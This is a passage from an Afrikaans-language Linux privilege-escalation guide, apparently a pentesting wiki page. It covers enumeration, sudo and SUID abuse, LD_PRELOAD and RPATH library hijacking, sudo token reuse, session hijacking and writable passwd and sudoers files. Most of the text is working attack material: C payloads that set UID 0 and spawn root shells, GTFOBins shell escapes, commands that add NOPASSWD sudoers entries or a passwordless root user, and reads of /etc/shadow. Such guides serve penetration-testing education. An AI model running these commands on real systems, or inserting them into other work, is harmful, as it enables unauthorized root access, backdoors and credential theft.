'n Voorbeeld van so 'n beleid in `/etc/dbus-1/system.d/wpa_supplicant.conf` word verskaf, wat toestemmings vir die root-gebruiker om besit te hê, na, en boodskappe te ontvang van `fi.w1.wpa_supplicant1`.

Beleide sonder 'n gespesifiseerde gebruiker of groep geld universeel, terwyl "standaard" konteksbeleide van toepassing is op almal wat nie deur ander spesifieke beleide gedek word nie.
```xml
<policy user="root">
<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
<allow send_interface="fi.w1.wpa_supplicant1"/>
<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
**Leer hoe om 'n D-Bus kommunikasie te ontleed en uit te buit hier:**

{% content-ref url="d-bus-enumeration-and-command-injection-privilege-escalation.md" %}
[d-bus-enumeration-and-command-injection-privilege-escalation.md](d-bus-enumeration-and-command-injection-privilege-escalation.md)
{% endcontent-ref %}

## **Netwerk**

Dit is altyd interessant om die netwerk te ontleed en uit te vind waar die masjien geleë is.

### Generiese ontleding
```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#Files used by network services
lsof -i
```
### Oop poorte

Bevestig altyd netwerkdienste wat op die masjien loop wat jy nie kon interaksie mee hê voor jy dit toegang nie:
```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
```
### Sniffing

Kyk of jy verkeer kan afluister. As jy kan, kan jy moontlik sekere geloofsbriewe vasvang.
```
timeout 1 tcpdump
```
## Gebruikers

### Generiese Opstel

Kontroleer **wie** jy is, watter **bevoegdhede** jy het, watter **gebruikers** in die stelsels is, wie kan **aanmeld** en wie het **root-bevoegdhede:**
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
w
#Login history
last | tail
#Last log of each user
lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### Groot UID

Sommige Linux-weergawes was deur 'n fout geraak wat gebruikers met **UID > INT\_MAX** toelaat om voorregte te eskaleer. Meer inligting: [hier](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [hier](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) en [hier](https://twitter.com/paragonsec/status/1071152249529884674).\
**Exploiteer dit** met: **`systemd-run -t /bin/bash`**

### Groepe

Kyk of jy 'n **lid van 'n groep** is wat jou moontlik root-voorregte kan gee:

{% content-ref url="interesting-groups-linux-pe/" %}
[interesting-groups-linux-pe](interesting-groups-linux-pe/)
{% endcontent-ref %}

### Knipbord

Kyk of daar iets interessants binne die knipbord geleë is (indien moontlik)
```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```
### Wagwoordbeleid
```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### Bekende wagwoorde

Indien jy **enige wagwoord** van die omgewing **ken, probeer om in te teken as elke gebruiker** met die wagwoord.

### Su Brute

Indien jy nie omgee om baie geraas te maak nie en `su` en `timeout` bineêre lêers op die rekenaar teenwoordig is, kan jy probeer om 'n gebruiker te krag met [su-bruteforce](https://github.com/carlospolop/su-bruteforce).\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) met die `-a` parameter probeer ook om gebruikers te krag.

## Skryfbare PATH-misbruik

### $PATH

Indien jy vind dat jy **binne 'n paar van die $PATH se lêers kan skryf**, kan jy bevoorregtinge eskaleer deur **'n agterdeur binne die skryfbare lêer** te skep met die naam van 'n bevel wat deur 'n ander gebruiker (idealiter root) uitgevoer gaan word en wat **nie gelaai word van 'n lêer wat voorafgaan** aan jou skryfbare lêer in $PATH nie.

### SUDO en SUID

Jy kan toegelaat word om 'n bevel uit te voer met sudo of hulle kan die suid-bit hê. Kontroleer dit met:
```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
Sommige **onverwagte bevele laat jou toe om lêers te lees en/of te skryf of selfs 'n bevel uit te voer.** Byvoorbeeld:
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### GEENWAGWOORD

Sudo-konfigurasie mag 'n gebruiker toelaat om 'n bepaalde bevel uit te voer met 'n ander gebruiker se regte sonder om die wagwoord te weet.
```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```
In hierdie voorbeeld kan die gebruiker `demo` `vim` as `root` hardloop, dit is nou maklik om 'n skaal te kry deur 'n ssh-sleutel by die root-gids te voeg of deur `sh` te roep.
```
sudo vim -c '!sh'
```
### SETENV

Hierdie riglyn laat die gebruiker toe om **'n omgewingsveranderlike in te stel** terwyl iets uitgevoer word:
```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```
Hierdie voorbeeld, **gebaseer op HTB-masjien Admirer**, was **kwesbaar** vir **PYTHONPATH kaping** om 'n willekeurige Python-biblioteek te laai terwyl die skrip as 'n root uitgevoer word:
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### Sudo-uitvoering om paaie te omseil

**Spring** om ander lêers te lees of gebruik **symlinks**. Byvoorbeeld in die sudoers-lêer: _hacker10 ALLES= (root) /bin/less /var/log/\*_
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
Indien 'n **wildcard** gebruik word (\*), is dit selfs makliker:
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**Teenmaatreëls**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Sudo-opdrag/SUID-binêre sonder opdragpad

As die **sudo-toestemming** gegee word aan 'n enkele opdrag **sonder om die pad te spesifiseer**: _hacker10 ALL= (root) less_ kan jy dit uitbuit deur die PAD-veranderlike te verander
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
Hierdie tegniek kan ook gebruik word as 'n **suid** binêre lêer 'n ander opdrag **uitvoer sonder om die pad daarna te spesifiseer (kontroleer altyd met** _**strings**_ **die inhoud van 'n vreemde SUID-binêre lêer)**.

[Voorbeeld van payloads om uit te voer.](payloads-to-execute.md)

### SUID-binêre lêer met opdragpad

As die **suid** binêre lêer 'n ander opdrag **uitvoer deur die pad te spesifiseer**, dan kan jy probeer om 'n **funksie uit te voer** wat genoem word na die opdrag wat die suid-lêer aanroep.

Byvoorbeeld, as 'n suid-binêre lêer _**/usr/sbin/service apache2 start**_ aanroep, moet jy probeer om die funksie te skep en dit uit te voer:
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```
### LD\_PRELOAD & **LD\_LIBRARY\_PATH**

Die **LD\_PRELOAD**-omgewingsveranderlike word gebruik om een of meer gedeelde biblioteke (.so-lêers) te spesifiseer wat deur die lêer gelaai moet word voordat alle ander, insluitend die standaard C-bibliotheek (`libc.so`). Hierdie proses staan bekend as die vooraf laai van 'n biblioteek.

Tog, om stelselsekerheid te handhaaf en te voorkom dat hierdie funksie uitgebuit word, veral met **suid/sgid** uitvoerbare lêers, dwing die stelsel sekere voorwaardes af:

- Die lêer ignoreer **LD\_PRELOAD** vir uitvoerbare lêers waar die werklike gebruikers-ID (_ruid_) nie ooreenstem met die effektiewe gebruikers-ID (_euid_).
- Vir uitvoerbare lêers met suid/sgid word slegs biblioteke in standaardpaaie wat ook suid/sgid is, voorafgelaai.

Privilege-escalation kan plaasvind as jy die vermoë het om opdragte met `sudo` uit te voer en die uitset van `sudo -l` die verklaring **env\_keep+=LD\_PRELOAD** insluit. Hierdie konfigurasie laat toe dat die **LD\_PRELOAD**-omgewingsveranderlike volhou en herken word selfs wanneer opdragte met `sudo` uitgevoer word, wat moontlik kan lei tot die uitvoering van willekeurige kode met verhoogde regte.
```
Defaults        env_keep += LD_PRELOAD
```
Stoor as **/tmp/pe.c**
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
Voer dit dan **saamstel** met behulp van:
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
Uiteindelik, **privileges verhoog** hardloop
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
{% hint style="danger" %}
'n Soortgelyke privesc kan misbruik word as die aanvaller beheer oor die **LD\_LIBRARY\_PATH** omgewingsveranderlike omdat hy beheer oor die pad waar biblioteke gaan gesoek word.
{% endhint %}
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
### SUID-binêre lêer - .so inspuiting

Wanneer 'n binêre lêer met **SUID**-permissies wat ongewoon lyk, dit raadsaam is om te verifieer of dit **.so** lêers behoorlik laai. Dit kan nagegaan word deur die volgende bevel uit te voer:
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
Byvoorbeeld, wanneer 'n fout soos _"open(“/path/to/.config/libcalc.so”, O\_RDONLY) = -1 ENOENT (No such file or directory)"_ ondervind word, dui dit op 'n potensiële vir uitbuiting.

Om hiervan gebruik te maak, sal 'n persoon voortgaan deur 'n C-lêer te skep, sê _"/path/to/.config/libcalc.c"_, wat die volgende kode bevat:
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
Hierdie kode, eens saamgestel en uitgevoer, het as doel om voorregte te verhoog deur lêertoestemmings te manipuleer en 'n skaal met verhoogde voorregte uit te voer.

Stel die bogenoemde C-lêer saam in 'n gedeelde voorwerp (.so) lêer met:
```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```
Uiteindelik, die hardloop van die geaffekteerde SUID-binêre lêer behoort die uitbuiting te aktiveer, wat moontlike sisteemkompromieë moontlik maak.

## Gedeelde Voorwerp Kaping
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
Nou dat ons 'n SUID-binêre lêer gevind het wat 'n biblioteek laai van 'n vouer waar ons kan skryf, laat ons die biblioteek in daardie vouer skep met die nodige naam:
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```
Indien jy 'n fout soos dit ontvang
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
Dit beteken dat die biblioteek wat jy gegenereer het 'n funksie genaamd `a_function_name` moet hê.

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) is 'n saamgestelde lys van Unix-binêre lêers wat deur 'n aanvaller uitgebuit kan word om plaaslike sekuriteitsbeperkings te omseil. [**GTFOArgs**](https://gtfoargs.github.io/) is dieselfde, maar vir gevalle waar jy **slegs argumente kan invoeg** in 'n opdrag.

Die projek versamel legitieme funksies van Unix-binêre lêers wat misbruik kan word om uit beperkte skulpe te breek, voorregte te eskaleer of te handhaaf, lêers oor te dra, bind- en omgekeerde skulpe te skep, en ander ná-uitbuitingstake te fasiliteer.

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'

{% embed url="https://gtfobins.github.io/" %}

{% embed url="https://gtfoargs.github.io/" %}

### FallOfSudo

As jy `sudo -l` kan toegang, kan jy die instrument [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) gebruik om te kyk of dit enige sudo-reël kan uitbuit.

### Hergebruik van Sudo Tokens

In gevalle waar jy **sudo-toegang** het, maar nie die wagwoord nie, kan jy voorregte eskaleer deur **te wag vir 'n sudo-opdraguitvoering en dan die sessietoken te kaap**.

Vereistes vir die eskalering van voorregte:

* Jy het reeds 'n skul as gebruiker "_sampleuser_"
* "_sampleuser_" het **`sudo` gebruik** om iets in die **laaste 15 minute** uit te voer (standaard is dit die duur van die sudo-token wat ons toelaat om `sudo` te gebruik sonder om enige wagwoord in te voer)
* `cat /proc/sys/kernel/yama/ptrace_scope` is 0
* `gdb` is toeganklik (jy kan dit oplaai)

(Jy kan `ptrace_scope` tydelik aktiveer met `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` of permanent deur `/etc/sysctl.d/10-ptrace.conf` te wysig en `kernel.yama.ptrace_scope = 0` in te stel)

Indien aan al hierdie vereistes voldoen word, **kan jy voorregte eskaleer deur gebruik te maak van:** [**https://github.com/nongiach/sudo\_inject**](https://github.com/nongiach/sudo\_inject)

* Die **eerste uitbuiting** (`exploit.sh`) sal die binêre lêer `activate_sudo_token` in _/tmp_ skep. Jy kan dit gebruik om die sudo-token in jou sessie te **aktiveer** (jy sal nie outomaties 'n root-skulp kry nie, doen `sudo su`):
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
* Die **tweede aanval** (`exploit_v2.sh`) sal 'n sh-skul in _/tmp_ skep **wat deur root besit word met setuid**
```bash
bash exploit_v2.sh
/tmp/sh -p
```
* Die **derde aanval** (`exploit_v3.sh`) sal 'n **sudoers-lêer skep** wat **sudo-tokens ewig maak en alle gebruikers toelaat om sudo te gebruik**
```bash
bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/\<Gebruikersnaam>

Indien jy **skryfregte** in die folder het of op enige van die geskepte lêers binne die folder, kan jy die bineêre [**write\_sudo\_token**](https://github.com/nongiach/sudo\_inject/tree/master/extra\_tools) gebruik om **'n sudo-teken vir 'n gebruiker en PID te skep**.\
Byvoorbeeld, as jy die lêer _/var/run/sudo/ts/sampleuser_ kan oorskryf en jy het 'n skaal as daardie gebruiker met PID 1234, kan jy **sudo-voorregte verkry** sonder om die wagwoord te weet deur die volgende te doen:
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers, /etc/sudoers.d

Die lêer `/etc/sudoers` en die lêers binne `/etc/sudoers.d` stel in wie `sudo` kan gebruik en hoe. Hierdie lêers **kan standaard slegs deur gebruiker root en groep root gelees word**.\
**As** jy hierdie lêer **kan lees**, kan jy dalk **interessante inligting verkry**, en as jy enige lêer **kan skryf**, sal jy in staat wees om **priviliges te eskaleer**.
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
As jy kan skryf, kan jy hierdie toestemming misbruik.
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
'n Ander manier om hierdie regte te misbruik:'
```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

Daar is alternatiewe vir die `sudo` binêre lêer soos `doas` vir OpenBSD, onthou om sy konfigurasie by `/etc/doas.conf` te kontroleer.
```
permit nopass demo as root cmd vim
```
### Sudo Oorheersing

As jy weet dat 'n **gebruiker gewoonlik met 'n masjien verbind en `sudo` gebruik** om voorregte te eskaleer en jy het 'n skaal binne daardie gebruiker konteks, kan jy **'n nuwe sudo uitvoerbare lêer skep** wat jou kode as root sal uitvoer en dan die gebruiker se bevel. Dan, **verander die $PATH** van die gebruiker konteks (byvoorbeeld deur die nuwe pad in .bash\_profile by te voeg) sodat wanneer die gebruiker sudo uitvoer, jou sudo uitvoerbare lêer uitgevoer word.

Let daarop dat as die gebruiker 'n ander skaal gebruik (nie bash nie) sal jy ander lêers moet wysig om die nuwe pad by te voeg. Byvoorbeeld [sudo-piggyback](https://github.com/APTy/sudo-piggyback) wysig `~/.bashrc`, `~/.zshrc`, `~/.bash_profile`. Jy kan 'n ander voorbeeld vind in [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire\_modules/bashdoor.py)

Of voer iets soos die volgende uit:
```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```
## Gedeelde Biblioteek

### ld.so

Die lêer `/etc/ld.so.conf` dui aan **waar die gelaai konfigurasie lêers vandaan kom**. Tipies bevat hierdie lêer die volgende pad: `include /etc/ld.so.conf.d/*.conf`

Dit beteken dat die konfigurasie lêers vanaf `/etc/ld.so.conf.d/*.conf` gelees sal word. Hierdie konfigurasie lêers **verwys na ander vouers** waar **biblioteke** gesoek gaan word. Byvoorbeeld, die inhoud van `/etc/ld.so.conf.d/libc.conf` is `/usr/local/lib`. **Dit beteken dat die stelsel vir biblioteke binne `/usr/local/lib` sal soek**.

Indien **'n gebruiker om enige rede skryfregte het** op enige van die aangeduide paaie: `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, enige lêer binne `/etc/ld.so.conf.d/` of enige vouer binne die konfigurasie lêer binne `/etc/ld.so.conf.d/*.conf` mag hy in staat wees om voorregte te eskaleer.\
Neem 'n kyk na **hoe om hierdie wanopset uit te buit** op die volgende bladsy:

{% content-ref url="ld.so.conf-example.md" %}
[ld.so.conf-example.md](ld.so.conf-example.md)
{% endcontent-ref %}

### RPATH
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```
Deur die lib na `/var/tmp/flag15/` te kopieer, sal dit deur die program op hierdie plek gebruik word soos gespesifiseer in die `RPATH` veranderlike.
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```
Dan skep 'n bose biblioteek in `/var/tmp` met `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6`
```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```
## Bevoegdhede

Linux-bevoegdhede bied 'n **subreeks van die beskikbare wortelbevoegdhede aan 'n proses**. Dit breek effektief wortelbevoegdhede op in kleiner en onderskeidende eenhede. Elkeen van hierdie eenhede kan dan onafhanklik aan prosesse toegeken word. Op hierdie manier word die volledige stel bevoegdhede verminder, wat die risiko van uitbuiting verminder.\
Lees die volgende bladsy om **meer te leer oor bevoegdhede en hoe om dit te misbruik**:

{% content-ref url="linux-capabilities.md" %}
[linux-capabilities.md](linux-capabilities.md)
{% endcontent-ref %}

## Gidsbevoegdhede

In 'n gids dui die **bit vir "uitvoer"** aan dat die betrokke gebruiker in die gids kan "**cd**".\
Die **"lees"** bit dui aan dat die gebruiker die **lêerlys** kan **sien**, en die **"skryf"** bit dui aan dat die gebruiker **lêers** kan **verwyder** en **nuwe** **lêers** kan **skep**.

## ACL's

Toegangsbeheerlyste (ACL's) verteenwoordig die sekondêre laag van diskresionêre bevoegdhede, wat in staat is om **die tradisionele ugo/rwx-bevoegdhede te oorskry**. Hierdie bevoegdhede verbeter beheer oor lêer- of gids-toegang deur regte aan spesifieke gebruikers toe te staan of te ontken wat nie die eienaars of deel van die groep is nie. Hierdie vlak van **fynkorreligheid verseker meer presiese toegangsbestuur**. Verdere besonderhede kan hier gevind word [**hier**](https://linuxconfig.org/how-to-manage-acls-on-linux).

**Gee** gebruiker "kali" lees- en skryfregte oor 'n lêer:
```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
**Kry** lêers met spesifieke ACL's van die stelsel:
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
## Maak skul sesies oop

In **ou weergawes** kan jy dalk 'n paar **skul** sessies van 'n ander gebruiker (**root**) **kap**.\
In **nuutste weergawes** sal jy slegs in staat wees om aan **skerm sessies** van **jou eie gebruiker** te **koppel**. Nietemin, jy kan **interessante inligting binne die sessie** vind.

### skerm sessies kap
**Lys skerm sessies**
```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions
```
![](<../../.gitbook/assets/image (141).png>)

**Heg tot 'n sessie**
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```
## tmux sessies kaping

Dit was 'n probleem met **ou tmux weergawes**. Ek was nie in staat om 'n tmux (v2.1) sessie wat deur root geskep is, te kaap as 'n nie-bevoorregte gebruiker.

**Lys tmux sessies**
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
![](<../../.gitbook/assets/image (837).png>)

**Heg aan 'n sessie**
```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
Kyk na **Valentine-boks van HTB** vir 'n voorbeeld.

## SSH

### Debian OpenSSL Voorspelbare PRNG - CVE-2008-0166

Alle SSL- en SSH-sleutels wat gegenereer is op Debian-gebaseerde stelsels (Ubuntu, Kubuntu, ens.) tussen September 2006 en 13 Mei 2008 kan deur hierdie fout geraak word.\
Hierdie fout word veroorsaak wanneer 'n nuwe ssh-sleutel in daardie OS geskep word, aangesien **slegs 32,768 variasies moontlik was**. Dit beteken dat al die moontlikhede bereken kan word en **met die ssh openbare sleutel kan jy soek na die ooreenstemmende privaatsleutel**. Jy kan die berekende moontlikhede hier vind: [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### SSH Interessante konfigurasiewaardes

* **PasswordAuthentication:** Specifiseer of wagwoordverifikasie toegelaat is. Die verstek is `nee`.
* **PubkeyAuthentication:** Specifiseer of openbare sleutelverifikasie toegelaat is. Die verstek is `ja`.
* **PermitEmptyPasswords**: Wanneer wagwoordverifikasie toegelaat is, spesifiseer dit of die bediener toegang tot rekeninge met leë wagwoorde toelaat. Die verstek is `nee`.

### PermitRootLogin

Spesifiseer of root kan inlog met ssh, verstek is `nee`. Moontlike waardes:

* `ja`: root kan inlog met wagwoord en privaatsleutel
* `sonder-wagwoord` of `verbied-wagwoord`: root kan slegs inlog met 'n privaatsleutel
* `gedwing-opdragte-slegs`: Root kan slegs inlog met 'n privaatsleutel en as die opdragte-opsies gespesifiseer is
* `nee`: nee

### AuthorizedKeysFile

Spesifiseer lêers wat die openbare sleutels bevat wat gebruik kan word vir gebruikersverifikasie. Dit kan tokens soos `%h` bevat, wat deur die tuisgids vervang sal word. **Jy kan absolute paaie aandui** (beginnend met `/`) of **relatiewe paaie van die gebruiker se tuisgids**. Byvoorbeeld:
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
Daardie konfigurasie sal aandui dat as jy probeer om in te teken met die **privaat** sleutel van die gebruiker "**toetsgebruikersnaam**" ssh gaan die publieke sleutel van jou sleutel vergelyk met dié wat in `/home/toetsgebruikersnaam/.ssh/authorized_keys` en `/home/toetsgebruikersnaam/toegang` geleë is.

### ForwardAgent/AllowAgentForwarding

SSH-agent deurstuur maak dit vir jou moontlik om **jou plaaslike SSH-sleutels te gebruik in plaas daarvan om sleutels** (sonder wagwoorde!) op jou bediener te laat lê. So, sal jy in staat wees om **te spring** via ssh **na 'n gasheer** en van daar af **te spring na 'n ander** gasheer **deur** die **sleutel** wat geleë is in jou **oorspronklike gasheer**.

Jy moet hierdie opsie instel in `$HOME/.ssh.config` soos hierdie:
```
Host example.com
ForwardAgent yes
```
Merk op dat as `Host` `*` is elke keer as die gebruiker na 'n ander masjien spring, daardie gasheer sal in staat wees om die sleutels te benader (wat 'n sekuriteitsprobleem is).

Die lêer `/etc/ssh_config` kan **oorheers** hierdie **opsies** en hierdie konfigurasie toelaat of weier.\
Die lêer `/etc/sshd_config` kan **toelaat** of **weier** ssh-agent deurstuur met die sleutelwoord `AllowAgentForwarding` (verstek is toelaat).

As jy vind dat Forward Agent gekonfigureer is in 'n omgewing, lees die volgende bladsy aangesien **jy dit kan misbruik om voorregte te eskaleer**:

{% content-ref url="ssh-forward-agent-exploitation.md" %}
[ssh-forward-agent-exploitation.md](ssh-forward-agent-exploitation.md)
{% endcontent-ref %}

## Interessante Lêers

### Profiele lêers

Die lêer `/etc/profile` en die lêers onder `/etc/profile.d/` is **skripte wat uitgevoer word wanneer 'n gebruiker 'n nuwe skaal hardloop**. Daarom, as jy **enige van hulle kan skryf of wysig, kan jy voorregte eskaleer**.
```bash
ls -l /etc/profile /etc/profile.d/
```
### Passwd/Shadow-lêers

Afhanklik van die OS kan die `/etc/passwd` en `/etc/shadow` lêers dalk 'n ander naam gebruik of daar kan 'n rugsteun wees. Daarom word dit aanbeveel om **hulle almal te vind** en **te kyk of jy hulle kan lees** om te sien **of daar hasse** binne die lêers is:
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
In sommige gevalle kan jy **wagwoordhasings** binne die `/etc/passwd` (of ekwivalente) lêer vind.
```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### Skryfbare /etc/passwd

Eerstens, genereer 'n wagwoord met een van die volgende bevele.
```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
Voeg dan die gebruiker `hacker` by en voeg die gegenereerde wagwoord by.
```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```
Byvoorbeeld: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

Jy kan nou die `su` bevel gebruik met `hacker:hacker`

Alternatiewelik kan jy die volgende lyne gebruik om 'n dummie-gebruiker sonder 'n wagwoord by te voeg.\
WAARSKUWING: jy kan die huidige sekuriteit van die masjien verminder.
```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
**Let op:** Op BSD-platforms is `/etc/passwd` geleë by `/etc/pwd.db` en `/etc/master.passwd`, ook is die `/etc/shadow` hernoem na `/etc/spwd.db`.

Jy moet nagaan of jy **kan skryf in sekere sensitiewe lêers**. Byvoorbeeld, kan jy skryf na 'n sekere **dienskonfigurasie-lêer**?
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
